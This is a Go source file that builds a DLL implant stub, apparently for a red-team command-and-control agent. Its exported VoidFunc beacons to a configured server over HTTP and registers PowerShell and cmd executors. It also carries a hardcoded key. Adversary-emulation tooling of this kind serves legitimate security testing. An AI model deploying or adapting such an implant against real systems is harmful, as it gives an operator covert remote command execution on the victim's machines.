package main

import "C"
import (
	"../core"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	defaultServer = "http://localhost:8888"
	defaultGroup = "my_group"
	defaultSleep = "60"
	defaultExeName = "shared.dll"
	c2Name = "HTTP"
	c2Key = ""
	defaultC2Proxy = ""
)

//export VoidFunc
func VoidFunc() {
	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
	core.Core(defaultServer, defaultGroup, defaultSleep, 0, []string{"psh","cmd"}, c2Config, defaultC2Proxy, false)
}

func main() {}
